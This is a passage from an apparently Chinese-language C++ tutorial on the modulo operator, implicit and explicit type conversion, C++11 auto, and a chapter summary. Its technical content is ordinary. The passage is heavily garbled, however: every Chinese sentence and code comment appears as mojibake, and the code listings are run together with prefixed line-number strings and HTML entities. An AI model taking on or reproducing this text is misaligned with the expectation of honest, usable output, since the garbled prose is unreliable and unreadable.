åçš„ä½™æ•°ã€‚å…¶ç¬¦å·é€šå¸¸ä¸è¢«é™¤æ•° a çš„ç¬¦å·ç›¸åŒï¼ˆC++11 æ ‡å‡†è§„å®šå¦‚æ­¤ï¼‰ã€‚ æ•°å­¦å…³ç³»:å¯¹äºæ•´æ•° a å’Œ b (å…¶ä¸­ b != 0)ï¼Œä»¥ä¸‹å…³ç³»é€šå¸¸æˆç«‹ï¼š(a / b) * b + (a % b) == a ç”¨é€”: åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦èƒ½è¢«å¦ä¸€ä¸ªæ•°æ•´é™¤ï¼ˆå¦‚æœ a % b == 0ï¼Œåˆ™ a èƒ½è¢« b æ•´é™¤ï¼‰ã€‚ è·å–ä¸€ä¸ªæ•°çš„æœ€ä½ä½æ•°å­—ï¼ˆnum % 10ï¼‰ã€‚ å°†æ•°å€¼é™åˆ¶åœ¨ä¸€ä¸ªèŒƒå›´å†…ï¼ˆä¾‹å¦‚ï¼Œç”Ÿæˆ 0 åˆ° N-1 ä¹‹é—´çš„æ•°ï¼švalue % Nï¼‰ã€‚ å‘¨æœŸæ€§æ“ä½œï¼ˆä¾‹å¦‚ï¼Œæ¯éš” M ä¸ªå…ƒç´ æ‰§è¡Œä¸€æ¬¡æ“ä½œï¼šif (count % M == 0)ï¼‰ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;int main() &#123; int total_seconds = 135; int seconds_per_minute = 60; int minutes = total_seconds / seconds_per_minute; // æ•´æ•°é™¤æ³•å¾—åˆ†é’Ÿæ•° int remaining_seconds = total_seconds % seconds_per_minute; // æ±‚æ¨¡å¾—å‰©ä½™ç§’æ•° std::cout &lt;&lt; total_seconds &lt;&lt; &quot; seconds is &quot; &lt;&lt; minutes &lt;&lt; &quot; minutes and &quot; &lt;&lt; remaining_seconds &lt;&lt; &quot; seconds.&quot; &lt;&lt; std::endl; // è¾“å‡º 135 seconds is 2 minutes and 15 seconds. // åˆ¤æ–­å¥‡å¶æ€§ int number = 21; if (number % 2 == 0) &#123; std::cout &lt;&lt; number &lt;&lt; &quot; is even.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; number &lt;&lt; &quot; is odd.&quot; &lt;&lt; std::endl; // è¾“å‡º 21 is odd. &#125; // è·å–ä¸ªä½æ•° int value = 123; int last_digit = value % 10; std::cout &lt;&lt; &quot;The last digit of &quot; &lt;&lt; value &lt;&lt; &quot; is &quot; &lt;&lt; last_digit &lt;&lt; std::endl; // è¾“å‡º 3 // è´Ÿæ•°æ±‚æ¨¡ (C++11 åŠä»¥åï¼Œç»“æœç¬¦å·ä¸è¢«é™¤æ•°ä¸€è‡´) int result1 = 10 % 3; // 1 int result2 = -10 % 3; // -1 int result3 = 10 % -3; // 1 int result4 = -10 % -3; // -1 std::cout &lt;&lt; &quot;10 % 3 = &quot; &lt;&lt; result1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;-10 % 3 = &quot; &lt;&lt; result2 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;10 % -3 = &quot; &lt;&lt; result3 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;-10 % -3 = &quot; &lt;&lt; result4 &lt;&lt; std::endl; // ä¸èƒ½ç”¨äºæµ®ç‚¹æ•° // double remainder = 10.5 % 3.2; // ç¼–è¯‘é”™è¯¯! return 0;&#125; 3.4.4 ç±»å‹è½¬æ¢C++å…è®¸åœ¨ä¸åŒæ•°æ®ç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ï¼Œè¿™ç§°ä¸ºç±»å‹è½¬æ¢ (Type Casting)**ã€‚è½¬æ¢å¯ä»¥éšå¼ (Implicitly)** å‘ç”Ÿï¼ˆç”±ç¼–è¯‘å™¨è‡ªåŠ¨å®Œæˆï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¾å¼ (Explicitly) è¿›è¡Œï¼ˆç”±ç¨‹åºå‘˜é€šè¿‡ä»£ç æŒ‡å®šï¼‰ã€‚ éšå¼ç±»å‹è½¬æ¢ (Automatic Conversion): åœ¨ä»¥ä¸‹æƒ…å†µä¸‹ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ‰§è¡Œç±»å‹è½¬æ¢ï¼š æ··åˆç±»å‹è¡¨è¾¾å¼: å½“ä¸€ä¸ªè¡¨è¾¾å¼ä¸­åŒ…å«ä¸åŒæ•°å€¼ç±»å‹çš„æ“ä½œæ•°æ—¶ï¼Œè¾ƒå°æˆ–è¾ƒä½ä¼˜å…ˆçº§çš„ç±»å‹é€šå¸¸ä¼šè¢«æå‡ (Promoted) ä¸ºè¾ƒå¤§æˆ–è¾ƒé«˜ä¼˜å…ˆçº§çš„ç±»å‹ï¼Œç„¶åè¿›è¡Œè¿ç®—ã€‚ æ•´å‹æå‡ (Integral Promotion): æ¯” int å°çš„æ•´å‹ï¼ˆbool, char, signed char, unsigned char, short, unsigned shortï¼‰åœ¨è¡¨è¾¾å¼ä¸­é€šå¸¸ä¼šè¢«æå‡ä¸º int (å¦‚æœ int èƒ½å®¹çº³å…¶æ‰€æœ‰å€¼) æˆ– unsigned intã€‚ ç®—æœ¯è½¬æ¢ (Usual Arithmetic Conversions): åœ¨æ¶‰åŠä¸åŒç®—æœ¯ç±»å‹ï¼ˆæ•´å‹å’Œæµ®ç‚¹å‹ï¼‰çš„è¿ç®—ä¸­ï¼Œéµå¾ªä¸€å¥—è§„åˆ™å°†æ“ä½œæ•°è½¬æ¢ä¸ºå…±åŒçš„ç±»å‹ï¼ˆé€šå¸¸æ˜¯ä¸¤è€…ä¸­â€œæ›´å®½â€æˆ–ç²¾åº¦æ›´é«˜çš„ç±»å‹ï¼‰ã€‚ä¾‹å¦‚ï¼Œint å’Œ double è¿ç®—æ—¶ï¼Œint ä¼šè¢«è½¬æ¢ä¸º doubleã€‚float å’Œ double è¿ç®—æ—¶ï¼Œfloat ä¼šè¢«è½¬æ¢ä¸º doubleã€‚ èµ‹å€¼: å°†ä¸€ä¸ªç±»å‹çš„å€¼èµ‹ç»™å¦ä¸€ç§ç±»å‹çš„å˜é‡æ—¶ï¼Œå³ä¾§çš„å€¼ä¼šè¢«è½¬æ¢ä¸ºå·¦ä¾§å˜é‡çš„ç±»å‹ã€‚è¿™å¯èƒ½å¯¼è‡´ç²¾åº¦æŸå¤±ï¼ˆå¦‚ double è½¬ intï¼‰æˆ–èŒƒå›´é—®é¢˜ï¼ˆå¦‚ long è½¬ shortï¼‰ã€‚ å‡½æ•°å‚æ•°ä¼ é€’: å°†å‚æ•°ä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œå¦‚æœå®å‚ç±»å‹ä¸å½¢å‚ç±»å‹ä¸åŒ¹é…ï¼Œä¼šå°è¯•è¿›è¡Œè½¬æ¢ã€‚ å‡½æ•°è¿”å›å€¼: ä»å‡½æ•°è¿”å›ä¸€ä¸ªå€¼æ—¶ï¼Œå¦‚æœè¿”å›å€¼ç±»å‹ä¸å‡½æ•°å£°æ˜çš„è¿”å›ç±»å‹ä¸åŒ¹é…ï¼Œä¼šå°è¯•è¿›è¡Œè½¬æ¢ã€‚ æ˜¾å¼ç±»å‹è½¬æ¢ (Explicit Casting): å½“éœ€è¦å¼ºåˆ¶è¿›è¡Œç±»å‹è½¬æ¢ï¼Œæˆ–è€…ä¸ºäº†ä½¿ä»£ç æ„å›¾æ›´æ¸…æ™°æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æ˜¾å¼ç±»å‹è½¬æ¢ã€‚C++æä¾›äº†å¤šç§è½¬æ¢æ–¹å¼ï¼š C é£æ ¼å¼ºåˆ¶ç±»å‹è½¬æ¢ (C-Style Cast): 12(typeName) expressiontypeName (expression) // å‡½æ•°å¼è½¬æ¢ è¿™ç§æ–¹å¼ç®€å•ç›´æ¥ï¼Œä½†åœ¨æŸäº›æƒ…å†µä¸‹ä¸å¤Ÿå®‰å…¨ï¼Œå› ä¸ºå®ƒå¯èƒ½æ‰§è¡Œå¤šç§ä¸åŒç±»å‹çš„è½¬æ¢ï¼ˆå¦‚ static_cast, const_cast, reinterpret_cast çš„ç»„åˆï¼‰ã€‚ C++ ç±»å‹è½¬æ¢è¿ç®—ç¬¦ (C++ Cast Operators): (æ›´æ¨èï¼Œæ›´å®‰å…¨ï¼Œæ„å›¾æ›´æ˜ç¡®) static_cast&lt;typeName&gt;(expression): ç”¨äºæ¯”è¾ƒâ€œè‡ªç„¶â€å’Œå®‰å…¨çš„è½¬æ¢ï¼Œå¦‚æ•°å€¼ç±»å‹ä¹‹é—´çš„è½¬æ¢ï¼ˆæ•´æ•°ä¸æµ®ç‚¹æ•°äº’è½¬ã€æ•´æ•°ä¸æ•´æ•°äº’è½¬ï¼‰ã€æŒ‡é’ˆç±»å‹ä¹‹é—´çš„ç›¸å…³è½¬æ¢ï¼ˆå¦‚ void* ä¸å…¶ä»–ç±»å‹æŒ‡é’ˆäº’è½¬ã€åŸºç±»æŒ‡é’ˆä¸æ´¾ç”Ÿç±»æŒ‡é’ˆäº’è½¬ï¼Œä½†éœ€è¦è°¨æ…ï¼‰ã€‚è¿™æ˜¯æœ€å¸¸ç”¨çš„ C++ è½¬æ¢ç¬¦ã€‚ dynamic_cast&lt;typeName&gt;(expression): ä¸»è¦ç”¨äºå¤„ç†ç±»ç»§æ‰¿å±‚æ¬¡ç»“æ„ä¸­çš„æŒ‡é’ˆæˆ–å¼•ç”¨è½¬æ¢ï¼ˆå‘ä¸‹è½¬å‹ï¼‰ï¼Œå¹¶åœ¨è¿è¡Œæ—¶è¿›è¡Œç±»å‹æ£€æŸ¥ã€‚å¦‚æœè½¬æ¢æ— æ•ˆï¼Œå¯¹äºæŒ‡é’ˆä¼šè¿”å› nullptrï¼Œå¯¹äºå¼•ç”¨ä¼šæŠ›å‡º std::bad_cast å¼‚å¸¸ã€‚éœ€è¦åŸºç±»æ˜¯å¤šæ€çš„ï¼ˆè‡³å°‘æœ‰ä¸€ä¸ªè™šå‡½æ•°ï¼‰ã€‚ const_cast&lt;typeName&gt;(expression): ç”¨äºæ·»åŠ æˆ–ç§»é™¤è¡¨è¾¾å¼çš„ const æˆ– volatile é™å®šç¬¦ã€‚é€šå¸¸ç”¨äºå»é™¤ constï¼Œä½†ä¿®æ”¹åŸæœ¬æ˜¯ const çš„å¯¹è±¡æ˜¯æœªå®šä¹‰è¡Œä¸ºã€‚ä¸»è¦ç”¨äºå¤„ç†å¸¸é‡æ€§ä¸åŒ¹é…çš„æ—§ APIã€‚ reinterpret_cast&lt;typeName&gt;(expression): ç”¨äºä½çº§åˆ«çš„ã€é€šå¸¸ä¸å®ç°ç›¸å…³çš„ã€ä¸å®‰å…¨çš„è½¬æ¢ã€‚ä¾‹å¦‚ï¼Œåœ¨æ•´æ•°å’ŒæŒ‡é’ˆä¹‹é—´è¿›è¡Œè½¬æ¢ï¼Œæˆ–è€…åœ¨ä¸ç›¸å…³çš„æŒ‡é’ˆç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚åº”æåŠ›é¿å…ä½¿ç”¨ï¼Œé™¤éç¡®å®ç†è§£å…¶åº•å±‚å«ä¹‰å’Œé£é™©ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;int main() &#123; // éšå¼è½¬æ¢ç¤ºä¾‹ int i_val = 10; double d_val = 3.14; short s_val = 5; // æ··åˆè¡¨è¾¾å¼ (ç®—æœ¯è½¬æ¢) double result1 = i_val + d_val; // i_val (int) æå‡ä¸º double (10.0), ç»“æœæ˜¯ double (13.14) std::cout &lt;&lt; &quot;int + double = &quot; &lt;&lt; result1 &lt;&lt; std::endl; // æ•´å‹æå‡ char c_val = &#x27;A&#x27;; // ASCII ç  65 int result2 = c_val + s_val; // c_val (char) å’Œ s_val (short) éƒ½æå‡ä¸º int, ç»“æœæ˜¯ int (70) std::cout &lt;&lt; &quot;char + short = &quot; &lt;&lt; result2 &lt;&lt; std::endl; // èµ‹å€¼è½¬æ¢ (å¯èƒ½ä¸¢å¤±ä¿¡æ¯) int i_from_d = d_val; // d_val (3.14) è½¬æ¢ä¸º int, å°æ•°éƒ¨åˆ†æˆªæ–­, i_from_d å˜ä¸º 3 std::cout &lt;&lt; &quot;int from double = &quot; &lt;&lt; i_from_d &lt;&lt; std::endl; short s_from_i = 100000; // 100000 å¯èƒ½è¶…å‡º short èŒƒå›´, ç»“æœæœªå®šä¹‰æˆ–å›ç»• std::cout &lt;&lt; &quot;short from large int = &quot; &lt;&lt; s_from_i &lt;&lt; std::endl; // æ˜¾å¼è½¬æ¢ç¤ºä¾‹ int total = 19; int count = 5; // C é£æ ¼è½¬æ¢ (ç”¨äºæµ®ç‚¹é™¤æ³•) double average1 = (double)total / count; double average2 = double(total) / count; // å‡½æ•°å¼è½¬æ¢ std::cout &lt;&lt; &quot;(double)total / count = &quot; &lt;&lt; average1 &lt;&lt; std::endl; // è¾“å‡º 3.8 std::cout &lt;&lt; &quot;double(total) / count = &quot; &lt;&lt; average2 &lt;&lt; std::endl; // è¾“å‡º 3.8 // C++ static_cast (æ¨èç”¨äºæ•°å€¼è½¬æ¢) double average3 = static_cast&lt;double&gt;(total) / count; std::cout &lt;&lt; &quot;static_cast&lt;double&gt;(total) / count = &quot; &lt;&lt; average3 &lt;&lt; std::endl; // è¾“å‡º 3.8 int char_code = static_cast&lt;int&gt;(&#x27;B&#x27;); // char è½¬ int std::cout &lt;&lt; &quot;Code for &#x27;B&#x27;: &quot; &lt;&lt; char_code &lt;&lt; std::endl; // è¾“å‡º 66 // æ¼”ç¤º reinterpret_cast (é€šå¸¸ä¸æ¨è) long addr = 1000; // int* ptr = reinterpret_cast&lt;int*&gt;(addr); // å°†æ•´æ•°è§†ä¸ºåœ°å€ (å±é™©!) // std::cout &lt;&lt; &quot;Pointer from address: &quot; &lt;&lt; ptr &lt;&lt; std::endl; return 0;&#125; å»ºè®®: å°½é‡é¿å…ä¸å¿…è¦çš„ç±»å‹è½¬æ¢ã€‚ ä¼˜å…ˆä½¿ç”¨ C++ çš„ static_cast è¿›è¡Œæ˜ç¡®ä¸”ç›¸å¯¹å®‰å…¨çš„æ•°å€¼æˆ–ç›¸å…³æŒ‡é’ˆè½¬æ¢ã€‚ è°¨æ…ä½¿ç”¨ C é£æ ¼è½¬æ¢ï¼Œå› ä¸ºå®ƒéšè—äº†è½¬æ¢çš„ç±»å‹å’Œé£é™©ã€‚ ä»…åœ¨ç»å¯¹å¿…è¦ä¸”ç†è§£åæœçš„æƒ…å†µä¸‹ä½¿ç”¨ const_cast å’Œ reinterpret_castã€‚ æ³¨æ„éšå¼è½¬æ¢å¯èƒ½å¯¼è‡´çš„ç²¾åº¦æŸå¤±æˆ–æ„å¤–è¡Œä¸ºï¼Œå°¤å…¶æ˜¯åœ¨æ··åˆæœ‰ç¬¦å·å’Œæ— ç¬¦å·æ•´æ•°æ—¶ã€‚ 3.4.5 C++11ä¸­çš„autoå£°æ˜C++11 å¼•å…¥äº† auto å…³é”®å­—ï¼Œå®ƒå…è®¸ç¼–è¯‘å™¨æ ¹æ®å˜é‡çš„åˆå§‹åŒ–è¡¨è¾¾å¼ (Initializer) è‡ªåŠ¨æ¨æ–­å‡ºå˜é‡çš„ç±»å‹ã€‚è¿™å¯ä»¥ç®€åŒ–ä»£ç ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†å¤æ‚ç±»å‹ï¼ˆå¦‚ STL è¿­ä»£å™¨æˆ–æ¨¡æ¿ç±»å‹ï¼‰æ—¶ã€‚ å·¥ä½œåŸç†: å½“ä½ ä½¿ç”¨ auto å£°æ˜å˜é‡æ—¶ï¼Œå¿…é¡»æä¾›ä¸€ä¸ªåˆå§‹åŒ–è¡¨è¾¾å¼ã€‚ç¼–è¯‘å™¨ä¼šæŸ¥çœ‹è¿™ä¸ªè¡¨è¾¾å¼çš„ç±»å‹ï¼Œå¹¶å°†è¯¥ç±»å‹èµ‹äºˆ auto å£°æ˜çš„å˜é‡ã€‚ 1auto variableName = initializationExpression; è¦ç‚¹: å¿…é¡»åˆå§‹åŒ–: ä½¿ç”¨ auto å£°æ˜çš„å˜é‡å¿…é¡»åœ¨å£°æ˜æ—¶åˆå§‹åŒ–ã€‚ ç±»å‹æ¨æ–­: ç±»å‹æ˜¯ä»åˆå§‹åŒ–è¡¨è¾¾å¼æ¨æ–­å‡ºæ¥çš„ï¼Œè€Œä¸æ˜¯å˜é‡æœ¬èº«çš„æŸç§é»˜è®¤ç±»å‹ã€‚ const å’Œå¼•ç”¨: auto é€šå¸¸ä¸ä¼šè‡ªåŠ¨æ¨æ–­å‡ºé¡¶å±‚çš„ const æˆ–å¼•ç”¨ã€‚å¦‚æœéœ€è¦ const æˆ–å¼•ç”¨ï¼Œéœ€è¦æ˜¾å¼æ·»åŠ ã€‚ auto x = value; // x çš„ç±»å‹ä¸ value ç›¸åŒ (const/å¼•ç”¨è¢«å‰¥ç¦») const auto cx = value; // cx æ˜¯ const ç±»å‹ auto&amp; rx = value; // rx æ˜¯å¼•ç”¨ç±»å‹ const auto&amp; crx = value; // crx æ˜¯ const å¼•ç”¨ç±»å‹ åˆ—è¡¨åˆå§‹åŒ–: å¯¹äº C++11 ä¸­çš„åˆ—è¡¨åˆå§‹åŒ– &#123;&#125;ï¼Œauto çš„æ¨æ–­è§„åˆ™æ¯”è¾ƒç‰¹æ®Šã€‚ auto x = &#123;1, 2, 3&#125;; // C++11/14: x è¢«æ¨æ–­ä¸º std::initializer_list auto y = &#123;1&#125;; // C++11/14: y è¢«æ¨æ–­ä¸º std::initializer_list auto z&#123;1&#125;; // C++17: z è¢«æ¨æ–­ä¸º int (æ³¨æ„æ²¡æœ‰ç­‰å·) ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;#include &lt;vector&gt; // åŒ…å« vector#include &lt;typeinfo&gt; // ç”¨äº typeid (ä»…ä½œæ¼”ç¤º)int main() &#123; // åŸºæœ¬ç±»å‹æ¨æ–­ auto i = 10; // i è¢«æ¨æ–­ä¸º int auto d = 3.14; // d è¢«æ¨æ–­ä¸º double auto f = 3.14f; // f è¢«æ¨æ–­ä¸º float auto c = &#x27;A&#x27;; // c è¢«æ¨æ–­ä¸º char auto b = true; // b è¢«æ¨æ–­ä¸º bool auto ll = 1234567890LL; // ll è¢«æ¨æ–­ä¸º long long std::cout &lt;&lt; &quot;Type of i: &quot; &lt;&lt; typeid(i).name() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Type of d: &quot; &lt;&lt; typeid(d).name() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Type of f: &quot; &lt;&lt; typeid(f).name() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Type of ll: &quot; &lt;&lt; typeid(ll).name() &lt;&lt; std::endl; // æ¨æ–­è¡¨è¾¾å¼ç»“æœç±»å‹ auto sum = i + d; // i(int) + d(double) -&gt; double, sum è¢«æ¨æ–­ä¸º double std::cout &lt;&lt; &quot;Type of sum: &quot; &lt;&lt; typeid(sum).name() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;sum = &quot; &lt;&lt; sum &lt;&lt; std::endl; // æ¨æ–­ const å’Œå¼•ç”¨ (éœ€è¦æ˜¾å¼æ·»åŠ ) int original = 100; auto copy = original; // copy æ˜¯ int (éå¼•ç”¨, é const) const auto const_copy = original; // const_copy æ˜¯ const int auto&amp; ref = original; // ref æ˜¯ int&amp; (å¼•ç”¨) const auto&amp; const_ref = original; // const_ref æ˜¯ const int&amp; (const å¼•ç”¨) copy = 200; // OK // const_copy = 200; // é”™è¯¯! const_copy æ˜¯ const ref = 300; // OK, original ä¹Ÿå˜ä¸º 300 // const_ref = 400; // é”™è¯¯! const_ref æ˜¯ const å¼•ç”¨ std::cout &lt;&lt; &quot;original: &quot; &lt;&lt; original &lt;&lt; std::endl; // è¾“å‡º 300 // ç”¨äºå¤æ‚ç±»å‹ (ä¾‹å¦‚ STL å®¹å™¨è¿­ä»£å™¨) std::vector&lt;std::string&gt; names = &#123;&quot;Alice&quot;, &quot;Bob&quot;, &quot;Charlie&quot;&#125;; auto it = names.begin(); // it è¢«æ¨æ–­ä¸º std::vector&lt;std::string&gt;::iterator std::cout &lt;&lt; &quot;First name: &quot; &lt;&lt; *it &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Type of it: &quot; &lt;&lt; typeid(it).name() &lt;&lt; std::endl; // C++11 åˆ—è¡¨åˆå§‹åŒ– auto list1 = &#123;10, 20, 30&#125;; // list1 æ˜¯ std::initializer_list&lt;int&gt; std::cout &lt;&lt; &quot;Type of list1: &quot; &lt;&lt; typeid(list1).name() &lt;&lt; std::endl; // C++17 åˆ—è¡¨åˆå§‹åŒ– (æ— ç­‰å·) // auto val&#123;42&#125;; // C++17: val æ˜¯ int // std::cout &lt;&lt; &quot;Type of val: &quot; &lt;&lt; typeid(val).name() &lt;&lt; std::endl; return 0;&#125; ä¼˜ç‚¹: å‡å°‘å†—ä½™ä»£ç ï¼Œå°¤å…¶æ˜¯åœ¨ç±»å‹åç§°å¾ˆé•¿æ—¶ã€‚ æé«˜ä»£ç çš„å¯ç»´æŠ¤æ€§ï¼Œå¦‚æœåˆå§‹åŒ–è¡¨è¾¾å¼çš„ç±»å‹æ”¹å˜ï¼Œauto å˜é‡çš„ç±»å‹ä¼šè‡ªåŠ¨æ›´æ–°ã€‚ æœ‰åŠ©äºæ³›å‹ç¼–ç¨‹ã€‚ ç¼ºç‚¹/æ³¨æ„äº‹é¡¹: è¿‡åº¦ä½¿ç”¨å¯èƒ½é™ä½ä»£ç çš„å¯è¯»æ€§ï¼Œå› ä¸ºè¯»è€…éœ€è¦æŸ¥çœ‹åˆå§‹åŒ–è¡¨è¾¾å¼æ‰èƒ½ç¡®å®šç±»å‹ã€‚ auto æ¨æ–­å‡ºçš„ç±»å‹å¯èƒ½ä¸æ˜¯ä½ æœŸæœ›çš„ï¼ˆä¾‹å¦‚ï¼Œå¿˜è®°æ·»åŠ  &amp; å¾—åˆ°å‰¯æœ¬è€Œä¸æ˜¯å¼•ç”¨ï¼‰ã€‚ å¯¹äºä»£ç†ç±»ï¼ˆProxy Classesï¼‰ï¼Œauto å¯èƒ½æ¨æ–­å‡ºä»£ç†ç±»å‹è€Œä¸æ˜¯æœŸæœ›çš„å€¼ç±»å‹ï¼Œéœ€è¦å°å¿ƒã€‚ å»ºè®®: åœ¨ç±»å‹å†—é•¿ã€æ˜æ˜¾æˆ–æ— å…³ç´§è¦æ—¶ä½¿ç”¨ auto å¯ä»¥æé«˜æ•ˆç‡ã€‚åœ¨ç±»å‹å¯¹äºç†è§£ä»£ç é€»è¾‘å¾ˆé‡è¦æ—¶ï¼Œæ˜¾å¼å†™å‡ºç±»å‹å¯èƒ½æ›´å¥½ã€‚ 3.5 æ€»ç»“æœ¬ç« æ·±å…¥æ¢è®¨äº†C++ç”¨äºå¤„ç†æ•°æ®çš„åŸºæœ¬å†…ç½®ç±»å‹ã€‚æˆ‘ä»¬é¦–å…ˆå­¦ä¹ äº†ç®€å•å˜é‡çš„å‘½åè§„åˆ™å’Œçº¦å®šï¼Œå¼ºè°ƒäº†åç§°çš„å¯è¯»æ€§å’Œåˆæ³•æ€§ã€‚ æ¥ç€ï¼Œæˆ‘ä»¬è¯¦ç»†ç ”ç©¶äº†C++çš„æ•´å‹å®¶æ—ï¼ŒåŒ…æ‹¬ shortã€intã€long å’Œ C++11 æ–°å¢çš„ long longã€‚æˆ‘ä»¬è®¨è®ºäº†å®ƒä»¬å„è‡ªçš„å¤§å°ã€è¡¨ç¤ºèŒƒå›´ä»¥åŠå¦‚ä½•é€‰æ‹©åˆé€‚çš„ç±»å‹ã€‚æˆ‘ä»¬è¿˜ä»‹ç»äº† unsigned ç±»å‹ï¼Œå®ƒä»¬ç”¨äºå­˜å‚¨éè´Ÿæ•´æ•°ï¼Œå¹¶å…·æœ‰æ›´å¤§çš„æ­£æ•°èŒƒå›´ã€‚æˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•ä¹¦å†™ä¸åŒè¿›åˆ¶ï¼ˆåè¿›åˆ¶ã€å…«è¿›åˆ¶ã€åå…­è¿›åˆ¶ï¼Œä»¥åŠC++14çš„äºŒè¿›åˆ¶ï¼‰çš„æ•´å‹å­—é¢å€¼ï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨åç¼€ï¼ˆU, L, LLï¼‰æ¥æŒ‡å®šå¸¸é‡çš„å…·ä½“ç±»å‹ï¼Œå¹¶äº†è§£äº†ç¼–è¯‘å™¨åœ¨æ²¡æœ‰åç¼€æ—¶å¦‚ä½•æ¨æ–­å¸¸é‡ç±»å‹ã€‚ char ç±»å‹è¢«ä»‹ç»ä¸ºä¸€ç§ç‰¹æ®Šçš„æ•´å‹ï¼Œä¸»è¦ç”¨äºå­˜å‚¨å­—ç¬¦ï¼Œä½†ä¹Ÿå¯ä»¥ä½œä¸ºå°æ•´æ•°ä½¿ç”¨ã€‚æˆ‘ä»¬å­¦ä¹ äº†å­—ç¬¦å­—é¢å€¼ï¼ˆä½¿ç”¨å•å¼•å·ï¼‰å’Œè½¬ä¹‰åºåˆ—ã€‚bool ç±»å‹ä¹Ÿè¢«å¼•å…¥ï¼Œç”¨äºè¡¨ç¤ºé€»è¾‘çœŸ (true) å’Œå‡ (false)ï¼Œä»¥åŠå®ƒä¸æ•´æ•°ï¼ˆ1å’Œ0ï¼‰ä¹‹é—´çš„è½¬æ¢å…³ç³»ã€‚ ä¸ºäº†åˆ›å»ºä¸å¯ä¿®æ”¹çš„å˜é‡ï¼ˆå¸¸é‡ï¼‰ï¼Œæˆ‘ä»¬å­¦ä¹ äº† const é™å®šç¬¦ã€‚ä½¿ç”¨ const å®šä¹‰çš„å¸¸é‡å¿…é¡»åœ¨å£°æ˜æ—¶åˆå§‹åŒ–ï¼Œå®ƒæä¾›äº†ç±»å‹å®‰å…¨å’Œä½œç”¨åŸŸæ§åˆ¶ï¼Œæ˜¯æ¯” #define æ›´å—æ¨èçš„å¸¸é‡å®šä¹‰æ–¹å¼ã€‚ ç„¶åï¼Œæˆ‘ä»¬è½¬å‘äº†æµ®ç‚¹ç±»å‹ (float, double, long double)ï¼Œç”¨äºè¡¨ç¤ºå¸¦å°æ•°çš„æ•°å­—ã€‚æˆ‘ä»¬å­¦ä¹ äº†ä¹¦å†™æµ®ç‚¹æ•°çš„ä¸¤ç§æ–¹å¼ï¼ˆæ ‡å‡†å°æ•°ç‚¹å’ŒEè¡¨ç¤ºæ³•ï¼‰ï¼Œäº†è§£äº†ä¸åŒæµ®ç‚¹ç±»å‹çš„ç²¾åº¦å’ŒèŒƒå›´å·®å¼‚ï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨åç¼€ï¼ˆf, Lï¼‰æŒ‡å®šæµ®ç‚¹å¸¸é‡ç±»å‹ï¼ˆé»˜è®¤ä¸º doubleï¼‰ã€‚æˆ‘ä»¬è¿˜è®¨è®ºäº†æµ®ç‚¹æ•°çš„ä¼˜ç‚¹ï¼ˆèŒƒå›´å¹¿ã€è¡¨ç¤ºå°æ•°ï¼‰å’Œå›ºæœ‰çš„ç¼ºç‚¹ï¼ˆç²¾åº¦é™åˆ¶ã€æ¯”è¾ƒå›°éš¾ï¼‰ã€‚ æœ€åï¼Œæˆ‘ä»¬å­¦ä¹ äº†C++çš„åŸºæœ¬ç®—æœ¯è¿ç®—ç¬¦ (+, -, *, /, %)ã€‚æˆ‘ä»¬æ¢è®¨äº†è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§å’Œç»“åˆæ€§è§„åˆ™ï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨æ‹¬å·æ¥æ§åˆ¶è¿ç®—é¡ºåºã€‚ç‰¹åˆ«åœ°ï¼Œæˆ‘ä»¬åŒºåˆ†äº†æ•´æ•°é™¤æ³•ï¼ˆç»“æœæˆªæ–­ï¼‰å’Œæµ®ç‚¹æ•°é™¤æ³•ï¼Œå¹¶å­¦ä¹ äº†æ±‚æ¨¡è¿ç®—ç¬¦ % çš„ç”¨æ³•ï¼ˆä¸»è¦ç”¨äºæ•´æ•°æ±‚ä½™ï¼‰ã€‚ ç±»å‹è½¬æ¢æ˜¯æœ¬ç« çš„å¦ä¸€ä¸ªé‡ç‚¹ï¼ŒåŒ…æ‹¬ç¼–è¯‘å™¨è‡ªåŠ¨æ‰§è¡Œçš„éšå¼è½¬æ¢ï¼ˆå¦‚æ•´å‹æå‡å’Œç®—æœ¯è½¬æ¢ï¼‰å’Œç¨‹åºå‘˜æŒ‡å®šçš„æ˜¾å¼è½¬æ¢ï¼ˆCé£æ ¼è½¬æ¢å’Œæ›´å®‰å…¨çš„C++è½¬æ¢ç¬¦ static_castã€dynamic_castã€const_castã€reinterpret_castï¼‰ã€‚æˆ‘ä»¬å¼ºè°ƒäº†è½¬æ¢ä¸­å¯èƒ½å‡ºç°çš„ä¿¡æ¯ä¸¢å¤±é—®é¢˜ã€‚ C++11 å¼•å…¥çš„ auto å…³é”®å­—ä¹Ÿè¢«ä»‹ç»ï¼Œå®ƒå…è®¸ç¼–è¯‘å™¨æ ¹æ®åˆå§‹åŒ–è¡¨è¾¾å¼è‡ªåŠ¨æ¨æ–­å˜é‡ç±»å‹ï¼Œç®€åŒ–äº†ä»£ç ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†å¤æ‚ç±»å‹æ—¶ã€‚ é€šè¿‡æœ¬ç« çš„å­¦ä¹ 